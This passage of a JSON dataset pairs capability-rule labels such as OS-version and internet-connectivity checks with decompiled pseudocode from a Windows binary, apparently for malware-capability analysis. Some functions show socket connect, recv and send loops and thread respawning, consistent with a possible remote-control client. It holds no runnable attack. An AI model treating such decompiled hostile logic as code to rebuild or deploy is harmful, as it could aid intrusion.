        "decompiled_code": "\nvoid __cdecl fcn.004926f8 noreturn (uint arg_8h)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint *puVar4;\n    code *pcVar5;\n    uint *in_FS_OFFSET;\n    uchar uVar6;\n    uint uStack4196;\n    uint uStack4192;\n    uchar *puStack4188;\n    uint uStack4184;\n    uint uStack4180;\n    uchar *puStack4176;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = 2;\n    do {\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    puStack4176 = 0x49273f;\n    fcn.00405f08();\n    uStack4180 = 0x492aed;\n    uStack4184 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffefa8;\n    puStack4188 = 0x492759;\n    puStack4176 = &stack0xfffffffc;\n    piVar3 = fcn.00404610();\n    puStack4188 = 0x492768;\n    puVar4 = fcn.00404610();\n    uStack4192 = 0x492a92;\n    uStack4196 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffef9c;\n    puStack4188 = &stack0xfffffffc;\n    fcn.00408460();\n    fcn.00405504();\n    fcn.00405504();\n    iVar2 = sub.wsock32.dll_socket();\n    if (iVar2 == -1) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread();\n    }\n    sub.wsock32.dll_htons();\n    iVar2 = sub.wsock32.dll_inet_addr();\n    if ((iVar2 == -1) && (iVar2 = sub.wsock32.dll_gethostbyname(),  iVar2 == 0)) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread();\n    }\n    sub.wsock32.dll_connect();\n    iVar2 = sub.wsock32.dll_recv();\n    if (iVar2 == -1) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread();\n    }\n    fcn.00405800();\n    fcn.0049393c();\n    iVar2 = sub.wsock32.dll_recv();\n    if (iVar2 != -1) {\n        while( true ) {\n            fcn.00403ae4();\n            iVar2 = sub.wsock32.dll_recv();\n            uVar6 = iVar2 == 0;\n            if (iVar2 < 1) break;\n            (**(*piVar3 + 0x10))();\n            sub.wsock32.dll_send();\n        }\n        fcn.0041b4ac(0, 0);\n        bVar1 = false;\n        fcn.00446740();\n        fcn.0041b4ac(0, 0);\n        fcn.00405894();\n        if (uVar6) {\n            (***puVar4)();\n            iVar2 = fcn.00445228();\n            **0x4a5120 = iVar2;\n            uVar6 = **0x4a5120 == 0;\n            if (!uVar6) {\n                pcVar5 = fcn.00445614();\n                **0x4a4f60 = pcVar5;\n                uVar6 = **0x4a4f60 == NULL;\n                if (!uVar6) {\n                    fcn.004058fc();\n                    fcn.00409dd8();\n                    (***0x4a4f60)();\n                    bVar1 = true;\n                }\n            }\n        }\n        fcn.00405894();\n        if (uVar6) {\n            (***puVar4)();\n            iVar2 = fcn.00445228();\n            **0x4a4c84 = iVar2;\n            if (**0x4a4c84 != 0) {\n                iVar2 = fcn.00445614();\n                **0x4a5054 = iVar2;\n                if (**0x4a5054 != 0) {\n                    bVar1 = true;\n                    while (iVar2 = sub.user32.dll_GetMessageA(),  iVar2 != 0) {\n                        sub.user32.dll_TranslateMessage();\n                        sub.user32.dll_DispatchMessageA();\n                    }\n                }\n            }\n        }\n        if (bVar1) {\n            fcn.00405784();\n            fcn.004938a4();\n        }\n        else {\n            fcn.00405784();\n            fcn.004938a4();\n        }\n        fcn.00404640();\n        fcn.00404640();\n        sub.wsock32.dll_closesocket();\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread();\n    }\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread();\n}\n",
        "token_count": 1125
    },
    "00493188": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00493188(uint noname_0, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    bool bVar2;\n    uint *noname_0_00;\n    uint uVar3;\n    uint uStack416;\n    uint uStack412;\n    uchar *puStack408;\n    uint uStack404;\n    uint uStack400;\n    uchar *puStack396;\n    uint var_180h;\n    uint var_17ch;\n    uint var_178h;\n    uint var_174h;\n    uint var_16dh;\n    uint var_168h;\n    uint var_158h;\n    uint var_154h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_17ch = 0;\n    var_178h = 0;\n    var_174h = 0;\n    var_4h = 0;\n    var_8h = 0;\n    puStack396 = 0x4931d1;\n    fcn.00405f08();\n    uStack400 = 0x4933ab;\n    uStack404 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe6c;\n    puStack408 = 0x4931e9;\n    puStack396 = &stack0xfffffffc;\n    fcn.0040e72c();\n    puStack408 = 0x4931f4;\n    fcn.00405504();\n    puStack408 = 0x493208;\n    fcn.00405784();\n    puStack408 = 0x49321e;\n    iVar1 = fcn.0040a384();\n    if (iVar1 != 0) {\n        if (var_16dh != '\\0') {\n            puStack408 = 0x4932b4;\n            fcn.00405784();\n            puStack408 = 0x4932ca;\n            iVar1 = fcn.0040a384();\n            if (iVar1 == 0) {\n                uStack412 = 0x493368;\n                uStack416 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xfffffe60;\n                puStack408 = &stack0xfffffffc;\n                do {\n                    bVar2 = (var_158h & 0x10) == 0;\n                    if (!bVar2) {\n                        fcn.00405894();\n                        if (!bVar2) {\n                            fcn.00405894();\n                            if (!bVar2) {\n                                noname_0_00 = &fcn.00493188::var_17ch;\n                                iVar1 = arg_ch;\n                                fcn.00405784();\n                                fcn.00493188(noname_0_00, iVar1);\n                            }\n                        }\n                    }\n                    iVar1 = fcn.0040a3d4();\n                } while (iVar1 == 0);\n                *in_FS_OFFSET = uStack416;\n                puStack408 = 0x49336f;\n                uStack412 = 0x493367;\n                fcn.0040a3f8();\n                return;\n            }\n        }\n        *in_FS_OFFSET = uStack404;\n        puStack396 = 0x4933b2;\n        uStack400 = 0x49338c;\n        fcn.00405490();\n        uStack400 = 0x49339d;\n        fcn.00405fd8();\n        uStack400 = 0x4933aa;\n        fcn.00405490();\n        return;\n    }\n    uStack412 = 0x49328d;\n    *in_FS_OFFSET = &stack0xfffffe60;\n    puStack408 = &stack0xfffffffc;\n    do {\n        uVar3 = *(arg_ch + -4);\n        uStack416 = 0x4933c4;\n        fcn.00405800();\n        if (**0x4a4d70 != '\\0') {\n    // WARNING: Subroutine does not return\n            sub.kernel32.dll_ExitThread(0);\n        }\n        iVar1 = fcn.0040a3d4();\n    } while (iVar1 == 0);\n    *in_FS_OFFSET = uStack416;\n    fcn.0040a3f8(0x493294, uVar3);\n    return;\n}\n",
        "token_count": 954
    },
    "004933ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004933ec noreturn (uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack76;\n    uint uStack72;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_18h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_20h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    var_4h = 0;\n    puStack52 = 0x493414;\n    fcn.00405f08();\n    uStack56 = 0x4934e0;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    fcn.00408460();\n    fcn.00405504();\n    fcn.00405504();\n    uStack72 = 0x49345c;\n    fcn.00493188(&fcn.004933ec::var_20h, &stack0xfffffffc);\n    uStack72 = 0x493494;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    if (var_4h == 0) {\n        fcn.004938a4();\n    }\n    fcn.00493508();\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 344
    },
    "0049378c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0049378c(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    uint lParam;\n    \n    puStack12 = &stack0xfffffffc;\n    lParam = 0;\n    uStack16 = 0x493891;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack20;\n    **0x4a4e70 = 0;\n    **0x4a4e80 = 0;\n    fcn.00489ee4();\n    **0x4a50b0 = 0;\n    **0x4a4de0 = 0;\n    if (**0x4a4bd4 != 0) {\n        fcn.00405664();\n        sub.user32.dll_PostThreadMessageA(**0x4a4bd4, 6, 4, lParam);\n    }\n    **0x4a4d70 = 0;\n    **0x4a4bd4 = 0;\n    if (**0x4a5110 == 1) {\n        fcn.004302b8();\n        fcn.00404640();\n    }\n    **0x4a5110 = 0;\n    sub.wsock32.dll_shutdown(**0x4a4f1c, 2);\n    sub.wsock32.dll_closesocket(**0x4a4f1c);\n    **0x4a4f1c = 0;\n    **0x4a4bd0 = 0;\n    **0x4a4f98 = 0;\n    uVar1 = 0;\n    sub.kernel32.dll_CreateThread(0, 0, fcn.00493a30, 0, 0, *0x4a5094);\n    *in_FS_OFFSET = uVar1;\n    fcn.0040546c(0x493898);\n    return;\n}\n",
        "token_count": 431
    },
    "0049d160": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0049d160(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    var_14h = 0;\n    var_1ch = 0;\n    puStack48 = 0x49d17d;\n    var_18h = param_2;\n    var_4h = in_EAX;\n    fcn.004058ec();\n    uStack52 = 0x49d2bc;\n    iStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    iVar3 = 0;\n    arg_8h = &fcn.0049d160::var_1ch;\n    puStack48 = &stack0xfffffffc;\n    fcn.0040ee40(arg_8h, *0x49d2cc);\n    fcn.00405504();\n    if (var_4h != 0) {\n        piVar1 = fcn.00404610();\n        (**(*piVar1 + 0x2c))();\n        do {\n            (**(*piVar1 + 0xc))();\n            fcn.00405a48(&fcn.0049d160::var_ch);\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            fcn.00405504();\n            fcn.00406858(iVar3 + 1);\n            fcn.00405800(var_10h, 0x49d2f0, var_ch);\n            iVar3 = iVar3 + 1;\n            (**(*piVar1 + 0x48))();\n            iVar2 = (**(*piVar1 + 0x14))();\n        } while (iVar2 != 0);\n    }\n    fcn.004068a0();\n    *in_FS_OFFSET = arg_8h;\n    iStack56 = 0x49d2c3;\n    fcn.0040546c();\n    fcn.00406864();\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 585
    },
    "0049d544": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0049d544(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x49d57a;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x4ad49c = *0x4ad49c + 1;\n    if ((*0x4ad49c == 0) && (**0x4a4ba0 == 0)) {\n        sub.wsock32.dll_WSACleanup();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 157
    },
    "0049d934": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0049d97b)\n\nvoid __fastcall fcn.0049d934(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (param_2 != '\\0') {\n        puStack44 = 0x49d94b;\n        in_EAX = fcn.00404964();\n    }\n    uStack48 = 0x49d9b7;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    fcn.0049d584();\n    fcn.00409a78();\n    *(in_EAX + 4) = 1;\n    fcn.0049d90c();\n    fcn.004054c0();\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x49d9be;\n    uStack48 = 0x49d9b6;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 277
    },
    "0049d9ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0049da45)\n\nvoid fcn.0049d9ec(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x49da08;\n    fcn.004058ec();\n    uStack36 = 0x49da7d;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    if (*(in_EAX + 4) == 0) {\n        puStack32 = &stack0xfffffffc;\n        fcn.0049d584();\n    }\n    else {\n        puStack32 = &stack0xfffffffc;\n        fcn.0049d6d4();\n    }\n    fcn.00409a78();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x49da84;\n    uStack36 = 0x49da7c;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 266
    },
    "0049f0ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0049f0ac(void)\n\n{\n    uint *in_FS_OFFSET;\n    bool bVar1;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x49f11e;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    bVar1 = *0x4a8918 == 0;\n    *0x4a8918 = *0x4a8918 + -1;\n    if (bVar1) {\n        fcn.0040520c();\n        fcn.00405234();\n        if (*0x4a87f5 != '\\0') {\n            fcn.004054c0();\n        }\n        fcn.0040e0f4();\n        fcn.00406ddc();\n        fcn.0040e210();\n        fcn.0040f3a8();\n        fcn.0040eac8();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 244
    },
    "00402360": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00402360(uint param_1, uint8_t *param_2)\n\n{\n    int64_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    iVar1 = (in_EAX + 1) * 0x89705f41;\n    uVar3 = iVar1 >> 0x20;\n    uVar2 = uVar3 >> 0x1d;\n    uVar4 = (uVar3 & 0x1fffffff) * 5 + (iVar1 >> 0x1e);\n    *param_2 = iVar1 >> 0x3d | 0x30;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar2 = uVar2 | uVar4 >> 0x1c;\n    *param_2 = uVar4 >> 0x1c | 0x30;\n    uVar3 = (uVar4 & 0xfffffff) * 5;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar4 = (uVar4 & 0xfffffff) * 5 & 0x7ffffff;\n    uVar2 = uVar2 | uVar3 >> 0x1b;\n    *param_2 = uVar3 >> 0x1b | 0x30;\n    uVar3 = uVar4 * 5;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar4 = uVar4 * 5 & 0x3ffffff;\n    uVar2 = uVar2 | uVar3 >> 0x1a;\n    *param_2 = uVar3 >> 0x1a | 0x30;\n    uVar3 = uVar4 * 5;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar4 = uVar4 * 5 & 0x1ffffff;\n    uVar2 = uVar2 | uVar3 >> 0x19;\n    *param_2 = uVar3 >> 0x19 | 0x30;\n    uVar3 = uVar4 * 5;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar4 = uVar4 * 5 & 0xffffff;\n    uVar2 = uVar2 | uVar3 >> 0x18;\n    *param_2 = uVar3 >> 0x18 | 0x30;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar3 = uVar4 * 5 >> 0x17;\n    uVar4 = uVar4 * 5 & 0x7fffff;\n    uVar2 = uVar2 | uVar3;\n    *param_2 = uVar3 | 0x30;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar3 = uVar4 * 5 >> 0x16;\n    uVar4 = uVar4 * 5 & 0x3fffff;\n    uVar2 = uVar2 | uVar3;\n    *param_2 = uVar3 | 0x30;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar3 = uVar4 * 5 >> 0x15;\n    *param_2 = uVar3 | 0x30;\n    param_2[(uVar2 | uVar3) != 0] = (uVar4 * 5 & 0x1fffff) * 5 >> 0x14 | 0x30;\n    return param_2 + ((uVar2 | uVar3) != 0) + 1;\n}\n",
        "token_count": 861
    },
    "00404a1c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00404a1c(void)\n\n{\n    if (1 < *0x4a1028) {\n        (**0x4a6014)(0xeedfadf, 0, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 57
    },
    "00404a74": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00404a74(void)\n\n{\n    uint in_EAX;\n    int32_t unaff_EBX;\n    uint uVar1;\n    uint auStack8 [2];\n    \n    if (1 < *0x4a1028) {\n        auStack8[0] = *(unaff_EBX + 4);\n        uVar1 = 0;\n        (**0x4a6014)(0xeedfae0, 0, 1, auStack8);\n        return uVar1;\n    }\n    return in_EAX;\n}\n",
        "token_count": 122
    },
    "00404a88": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00404a88(void)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    \n    if (1 < *0x4a1028) {\n        uVar1 = 0;\n        (**0x4a6014)(0xeedfae0, 0, 1, &stack0xfffffff8);\n        return uVar1;\n    }\n    return in_EAX;\n}\n",
        "token_count": 91
    },
    "00404abc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404abc(uint param_1, uint param_2)\n\n{\n    uint uStack16;\n    uint uStack8;\n    \n    if (1 < *0x4a1028) {\n        uStack16 = 0x404acd;\n        uStack8 = param_2;\n        fcn.00404a9c();\n        (**0x4a6014)(0xeedfae1, 0, 1, &stack0xfffffff0);\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "00404ae4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404ae4(uint param_1, uint param_2)\n\n{\n    uint uStack4;\n    \n    if (1 < *0x4a1028) {\n        uStack4 = param_2;\n        (**0x4a6014)(0xeedfae2, 0, 1, &uStack4);\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "00404b00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00404b00(uint param_1, uint param_2)\n\n{\n    uint in_EAX;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = param_2;\n    uStack4 = in_EAX;\n    if (1 < *0x4a1028) {\n        (**0x4a6014)(0xeedfae3, 0, 2, &uStack8);\n    }\n    return CONCAT44(uStack8, uStack4);\n}\n",
        "token_count": 115
    },
    "00405b8c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405b8c(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (0 < param_2) {\n        iVar1 = *in_EAX;\n        if ((iVar1 != 0) && (*(iVar1 + -8) == 1)) {\n            fcn.00402f24();\n            *in_EAX = iVar1;\n            *(iVar1 + -4) = param_2;\n            *(param_2 + iVar1) = 0;\n            return;\n        }\n        iVar1 = fcn.00405530();\n        if (*in_EAX != 0) {\n            fcn.004030ec();\n        }\n    }\n    fcn.0040546c();\n    *in_EAX = iVar1;\n    return;\n}\n",
        "token_count": 195
    },
    "00405e78": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405e78(uint arg_8h)\n\n{\n    fcn.00405de8();\n    fcn.00405d38();\n    return;\n}\n",
        "token_count": 40
    },
    "004078a8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004078a8(uint lpMutexAttributes, int32_t arg_ch, uint bInitialOwner)\n\n{\n    sub.kernel32.dll_CreateMutexA(lpMutexAttributes, arg_ch != 0, bInitialOwner);\n    return;\n}\n",
        "token_count": 54
    },
    "0040a748": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0040a748(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = fcn.004058fc(0);\n    iVar2 = sub.kernel32.dll_CreateDirectoryA(uVar1);\n    return iVar2 != 0;\n}\n",
        "token_count": 64
    },
    "0040aa14": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040aa14(uint32_t param_1)\n\n{\n    char cVar1;\n    uchar auStack53 [33];\n    uchar *puStack20;\n    uchar uStack16;\n    \n    puStack20 = auStack53 + 1;\n    if (0x1f < param_1) {\n        param_1 = 0x1f;\n    }\n    cVar1 = fcn.0040e424();\n    if (cVar1 == '\\x01') {\n        param_1 = param_1 - 1;\n    }\n    fcn.0040a7a8();\n    auStack53[param_1 + 1] = 0;\n    uStack16 = 6;\n    fcn.004096b4();\n    return;\n}\n",
        "token_count": 171
    },
    "0040b894": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n\nuchar __cdecl fcn.0040b894(double *arg_8h)\n\n{\n    uint16_t *puVar1;\n    uint16_t in_AX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint16_t in_CX;\n    int32_t iVar4;\n    uint16_t in_DX;\n    int32_t iVar5;\n    uint var_8h;\n    uchar var_3h;\n    uint var_2h;\n    \n    var_3h = 0;\n    uVar2 = fcn.0040b858();\n    iVar5 = (uVar2 & 0x7f) * 0x18;\n    if ((((in_AX != 0) && (in_AX < 10000)) && (in_DX != 0)) &&\n       (((in_DX < 0xd && (in_CX != 0)) && (puVar1 = iVar5 + 0x4a17fe + in_DX * 2,  in_CX < *puVar1 || in_CX == *puVar1))\n       )) {\n        iVar3 = in_DX - 1;\n        if (0 < iVar3) {\n            iVar4 = 1;\n            do {\n                in_CX = in_CX + *(iVar5 + 0x4a17fe + iVar4 * 2);\n                iVar4 = iVar4 + 1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        iVar3 = in_AX - 1;\n        iVar5 = iVar3;\n        if (iVar3 < 0) {\n            iVar5 = in_AX + 2;\n        }\n        *arg_8h = ((iVar3 * 0x16d + (iVar5 >> 2)) - iVar3 / 100) + iVar3 / 400 + in_CX + -0xa955a;\n        var_3h = 1;\n    }\n    return var_3h;\n}\n",
        "token_count": 443
    },
    "0040e210": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040e210(void)\n\n{\n    int32_t iVar1;\n    uint uStack148;\n    uint uStack144;\n    uint32_t uStack140;\n    int32_t iStack136;\n    \n    uStack148 = 0x94;\n    iVar1 = sub.kernel32.dll_GetVersionExA(&uStack148);\n    if (iVar1 != 0) {\n        *0x4a17e8 = iStack136;\n        *0x4a17ec = uStack148;\n        *0x4a17f0 = uStack144;\n        if (iStack136 == 1) {\n            *0x4a17f4 = uStack140 & 0xffff;\n        }\n        else {\n            *0x4a17f4 = uStack140;\n        }\n        fcn.004056dc();\n    }\n    return;\n}\n",
        "token_count": 190
    },
    "004100b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004100b0(uint arg_8h, int32_t arg_ch, uint noname_2, int16_t *arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack20 = &fcn.004100b0::var_1h + 1;\n    uStack24 = 0x41011d;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (arg_ch == 0x400) {\n        fcn.004056f4();\n        fcn.00409f80();\n        *arg_14h = -(var_1h != '\\0');\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x410124;\n    uStack24 = 0x41011c;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 256
    },
